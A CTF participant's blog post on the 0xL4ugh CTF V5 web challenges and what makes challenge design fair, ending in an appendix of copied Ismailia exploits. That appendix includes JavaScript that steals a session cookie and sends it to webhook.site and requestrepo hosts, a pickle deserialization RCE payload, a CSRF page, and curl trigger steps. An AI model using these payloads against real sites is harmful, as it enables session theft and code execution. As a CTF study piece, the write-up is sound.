---
author: atch2203
pubDatetime: 2026-01-31
title: 0xL4ugh CTF V5 and Good Challenge Design
featured: false
draft: false
tags:
  - cybersec
description: Things I learned from 0xL4ugh CTF V5
---
Last week I played in 0xL4ugh CTF V5, one of the 0 weight classics, and this year they had a crazy web category, with a handful of 0 days (including one in nextjs!). While I only solved a few easier challenges, I wanted to do a higher level reflection on the category. Of course, I also looked at writeups for almost all the web challenges to learn new web techniques/concepts, but here I will mostly be focusing on specific parts of challenges, leaving the more comprehensive solutions for other writeups.

> If you want links to web writeups, here are all the ones I found/read:
> - pdf.exe: https://medium.com/@00xCanelo/pdf-exe-0xl4ugh-v5-ctf-643455d4e05f, https://mushroom.cat/ctf/nextjs-ssrf-python-crlf-pdfkit-injection
> - gap: https://mushroom.cat/ctf/json-js-rce-lodash
> - 0xnote: https://hackmd.io/@winky/Sy8M59mI-l
> - 0xClinic: https://gist.github.com/aelmosalamy/70ce2ca59139b7eb0e2d06a3e73c5d0d, https://github.com/0xkalawy/My-Challenges-WriteUps/blob/main/0xL4ugh%20CTF%20v5/0xClinic.md
> - 1nfinity: https://github.com/ZeyadZonkorany/0xL4ugh-CTF-2025-Web, https://gist.github.com/0xa1eph/f6d191819a61fac5bb8b9ceda9a30373
> - Ghost Board: https://gist.github.com/StroppaFR/01ec5f39b5649f378c60dc2c7e4f8280
> - Ismailia: Scroll to the bottom of this post

# Some things I found helped as a player
### Use the browser as little as possible
Just cause the bot in a web challenge uses a browser doesn't mean that you should too. You can always use it yourself to learn how a specific interaction works, but once you know, it's a lot faster to have an automated script to do your exploit testing. 
Additionally, having a complete exploit script at the end makes doing a writeup a lot easier and faster.

### When in doubt, look at the dependencies, and if that doesn't work, look at the source
The only way to know what is actually going on in the backend is to have an understanding of how the dependencies work. You should always first check if CVEs or public exploits already exist (they usually won't, since otherwise this would be hack the box), but looking at the documentation to fully know the side effects of each function is vital to not getting lost. If all else fails, then the only logical option left is to look at the source.

# Challenge Design
From a challenge author's perspective, I found these "easy" (not so easy) challenges well made, and wanted to deconstruct a few ways on why they felt not bad to play.

## "Checkpoints" along the challenge
Both while playing and reading the writeups, I constantly found that the challenges had good "checkpoints" indicating what an attacker should do, ranging from a "painfully obvious" way to more subtle ways, all making the challenges less guessy and more enjoyable.

### Smolweb xss and exfiltration:
In Smolweb, you could get an XSS payload on the bot after doing a double SQL injection. However, there was a CSP that prevented most unsafe things. Despite this, there were obvious indicators:
```python
@rating_app.after_request
def add_security_headers(response):
    csp = (
        "default-src 'self'; "
        "script-src 'self' https://cdn.tailwindcss.com https://www.youtube.com; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "img-src 'self' data:; "
        "child-src 'self' https://www.youtube.com; "
        "frame-src 'self' https://www.youtube.com; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "form-action 'self';"
    )
    response.headers['Content-Security-Policy'] = csp
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```
The `script-src/child-src/frame-src https://www.youtube.com` and `style-src 'unsafe-inline'` immediately stand out (*usually in a CTF challenge, anything not necessary to the "baseline functionality/minimum viable application" are something to be explored*), and they point to how somebody might exploit this:
1) Somehow use a script tag pointing to youtube to get xss
2) Somehow get the data out using the style src (I didn't actually do this, but you could try [CSS exfiltration](https://portswigger.net/research/blind-css-exfiltration) with `@import` to exfil)

If you did research into how to get reflected payload in Youtube, you would find oembed callbacks, which could be used to get arbitrary javascript while still obeying the CSP.

I liked the structure of the challenge with semi-obvious pointers and especially liked how it was able to point me into learning a CSP "bypass" using youtube oembeds, something that I would never have found otherwise.

### 4llD4y
This challenge had the most solves, but it still had some non-trivial concepts. 
In `init.sh`, we can see the flag is in a random file in the root directory, meaning we either need an RCE or directory list + arbitrary file read.
```sh
echo "$FLAG" >> /flag_$(head -c 8 /dev/urandom | od -An -tx1 | tr -d ' ').txt
unset FLAG
```
The following is the (almost) complete source code for `app.js`, all in less than 40 lines:
```js
import express from 'express';
import { Window } from 'happy-dom';
import { nest } from 'flatnest';

const app = express();
app.use(express.json({ limit: '1mb' }));

app.post('/config', (req, res) => {
  const incoming = typeof req.body === 'object' && req.body ? req.body : {};
  try {
    nest(incoming);
  } catch (error) {
    return res.status(400).json({ error: 'invalid config', details: error.message });
  }

  return res.json({ message: 'configuration applied' });
});

app.post('/render', (req, res) => {
  try {
    console.log("got", req.body)
    const html = typeof req.body?.html === 'string' ? req.body.html : '';
    console.log("html", html)
    const window = new Window({ console });
    window.document.write(html);
    const output = window.document.documentElement.outerHTML;
    res.type('html').send(output);

  }
  catch (e) {
    console.log("Error ", e)
    res.json({ "Error": e })
  }
});
```

Since this code doesn't obviously look exploitable, we can look into the libraries `flatnest` and `happy-dom`.
For `/config`, there is a CVE CVE-2023-26135 in flatnest that allows for prototype pollution, but it was already patched. Thankfully, if you look into the [source code](https://www.npmjs.com/package/flatnest?activeTab=code), specifically the `nest()` and `seek()` functions, you can see that they only patched the simple prototype pollution. You can still achieve prototype pollution through "circular shennanigans":
```json
{ 
	"e": "[Circular (__proto__)]", 
	"e.property":"polluted" // here e is now __proto__
}
```

Once we have prototype pollution, there is only one thing left: the `/render` endpoint which uses `happy-dom`. If we look into happy-dom, we can find that there is an "enableJavaScriptEvaluation" setting that will allow `Window` objects to run javascript. That means we can just just get RCE using `process` and `spawn_sync`.

I feel that this challenge was as clear as it could be in saying "There are two parts to this challenge: prototype pollution and RCE" without explicitly telling the player, helping make it minimally guessy. The conciseness of the source also made solving this challenge a lot more enjoyable, which is why I also want to talk about simplicity.

## Simplicity
Unlike some challenges where a big part of the challenge is "finding the one line or endpoint where there is an issue," many of these challenges were painfully clear, really helping players identify the route and focus on improving their technical skills. I want to highlight two more challenges whose simplicity helped people solve a harder challenge past their limit.

### PDF.exe
This challenge had a 0-day, but the way they set up the challenge forced players to find the 0-day. When you first look at the challenge, there is a public facing server and an internal network, meaning that we either have to get SSRF or RCE on the public server.
There weren't that many files in the public server:
```
  prod
 │ ├╴  app
 │ │ ├╴  globals.css
 │ │ ├╴  layout.tsx
 │ │ └╴  page.tsx
 │ ├╴  actions.ts
 │ ├╴  next-env.d.ts
 │ ├╴  next.config.ts
 │ ├╴  package-lock.json
 │ ├╴  package.json
 │ └╴  tsconfig.json
```
Almost everything is default except for a simple web app (which has a plaintext password leak due to `"use client"`), as well as this next config:
```js
const nextConfig: NextConfig = {
  images: {
    remotePatterns: [{ protocol: "http", hostname: "**" }]
  }
}
```
This should clearly stick out, and if you look at the next.js docs, you will quickly see that you can have the server request images from any http server on your behalf by using the 
`/_next/image?url=` endpoint. Unfortunately, trying `url=http://localhost:5000/...` doesn't work, as next.js tries to block private IPs. 

If there was more attack surface in this challenge, then most people would give up and try something else, but since this is the only possible lead, this must be the way. 

To make things short, if you looked into the next.js source code for this, you would find two calls to the url/domain: one to check if it's private, and another one to make the request if it isn't. This meant that you could have your domain resolve to a public ip first, then resolve to a private ip after that. 

The other parts of the challenge was not as simple, but since it only allowed one input, thinking through all the possiblities would lead you to stumble upon clrf injection, allowing you to get an arbitrary html input to pdfkit. Looking into the pdfkit documentation would show that you could use `pdfkit-*` meta tags to do various things, including reading a file and making a post request with the output (albeit with some command flag shennanigans). 

I really liked how the challenge made you rediscover a 0-day, and it clearly was effective, as more than 30 teams solved it.

### gap
This challenge is one of the main ones that inspired me to make this post. The whole source is just these two files:

```dockerfile
FROM node:18-alpine

WORKDIR /app

RUN npm install express consolidate lodash body-parser

RUN mkdir views && echo '<%= input %>' > views/index.html

RUN echo "0xL4ugh{REDACTED}" > /flag.txt

COPY server.js .

EXPOSE 3000

CMD ["node", "server.js"]
```

```js
const express = require('express');
const cons = require('consolidate');
const path = require('path');

const app = express();

app.engine('html', cons.lodash);
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'html');

app.use(express.json());

app.post('/render', (req, res) => {
  res.render('index', req.body, (err, html) => {
    if (err) return res.sendStatus(500);
    res.send(html);
  });
});

app.listen(3000, () => console.log('listening on 3000'));
```

There is literally nothing of note here. All we get is arbitrary input into lodash's templating engine, meaning that there is a vulnerability in lodash. 

I will admit, I used AI assistance heavily here, and it definitely helped a lot. I won't get too much into the technical details here, you can read the [author writeup](https://mushroom.cat/ctf/json-js-rce-lodash) for it, but in essence you could cause a desync between arguments/values in an anonymous/`new` Function in Lodash to execute arbitrary js.

By focusing all the attention on Lodash's parser, finding the 0-day was not so guessy.

# Closing thoughts
I do recognize that not every CTF will have a 0-day and be able to have source code as simple as this CTF, but these challenges point to how challenge design can make playing more enjoyable while also learning more. Namely, having only the required functionality for the exploit and minimizing red herrings/distractions can help players focus on learning new topics.

I also do recognize that simplicity isn't necessary to make a good challenge; the other half of web challenges in this CTF were complex and had many parts, but they still were challenging and taught me a lot about different web concepts. Another part of CTFs that come with experience is being able to identify and intuit worthwhile leads in complex source code, which is a skill applicable to real life work in addition to technical knowledge.

## Appendix: Ismailia writeups
I wasn't able to find any writeups for Ismailia online, but people posted their exploits in discord. Just in case anybody wasn't able to find them, I am copying them to here as well.

### Ismailia Summary (Intended/challenge author version):
1. We verify a buyer account using a MongoDB ObjectId prediction because the verification token == `user._id`
2. DOM clobber `CONFIG_ANIMATIONS` with `http:a.com` to bypass origin check in `new URL()`
3. We send our payload as a product review.
4. We setup two hooks. 1st hook serving HTML with bfcache trick to trigger `requestIdleCallback` and execute our JS
5. 2nd hook serves JS payload which performed cookie smuggling, sent a request to unauthenticated endpoint and grabbed the sandwiched `session_id` from there:
```js
document.cookie = 'theme="; Path=/products; SameSite=None; Secure;'
document.cookie = 'a="; SameSite=None; Secure;'
fetch('/products', {credentials: 'include'}).then(r => r.text()).then(r => {
    const doc = new DOMParser().parseFromString(r, "text/html");
    fetch('//f5957737-9bfb-486f-8706-8bd780134e38.webhook.site?'+encodeURIComponent(doc.body.className), {mode:'no-cors'});
})
```
6.  As a seller, we use `upload-document` to perform AFW and write a deserialization session payload
7. Trigger the poisoned session and get the flag

### Person 2
dom colebbring -> disk cache to bypass requestidlecallback() -> xss -> cookie smuggling to get the cookie

csrf payload:
```html
<body>
<iframe src="http://127.0.0.1:8088/seller_product?id=2" id="x"></iframe>
  <script>
    setTimeout(() => {
    x.src = 'http://127.0.0.1:8088'
}, 3500)
setTimeout(() => {
    x.src = 'https://joaxcar.com/back.html'
}, 3500)
  </script>
</body>```

dom clobbering:
```html

<img id="CONFIG_ANIMATIONS" data-url="https:<your-site>">
```

store this js code in ur site (this is for cookie smuggling):
```js

document.cookie = 'theme="; Path=/products; SameSite=None; Secure;'
document.cookie = 'a="; SameSite=None; Secure;'
fetch('/products', {credentials: 'include'}).then(r => r.text()).then(r => {
    const doc = new DOMParser().parseFromString(r, "text/html");
    fetch('https://esn5ntql.requestrepo.com/?data=' + encodeURI(doc.body.className),  {mode:'no-cors'} )
})
```

### Person 3 (Only second half of exploit)
6. Create exploit HTML file 

```html
<!DOCTYPE html> 
<html>
<head><title>Loading...</title></head>
<body>
<script>
const PAYLOAD = "gASVQwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCgvcmVhZGZsYWcgPiAvYXBwL3N0YXRpYy9qcy9mbGFnLnR4dCAyPiYxlIWUUpQu"; 
const SESSION_ID = "pwned.png"; 
const payloadBytes = Uint8Array.from(atob(PAYLOAD), c => c.charCodeAt(0));
const file = new File([payloadBytes], `/app/sessions/session-${SESSION_ID}`, {type: 'image/png'});
const formData = new FormData();
formData.append('name', 'x'); 
formData.append('description', 'x');
formData.append('price', '1');
formData.append('image', file); 
fetch('https://webctf.online/seller_upload', {
method: 'POST', 
body: formData, 
credentials: 'include', 
mode: 'no-cors' 
}); 
</script> 
</body> 
</html> 
```
2. Host on public server

python3 -m http.server 80 

3. Send exploit URL to bot

curl -X POST http://challenge.ip:1337/ -d "url=http://YOUR_VPS_IP/exploit.html" 

4. Wait ~20 seconds for bot to visit

5. Trigger pickle deserialization 

curl -b "session_id=pwned.png" https://webctf.online/ 

6. Get flag 

curl https://webctf.online/static/js/flag.txt
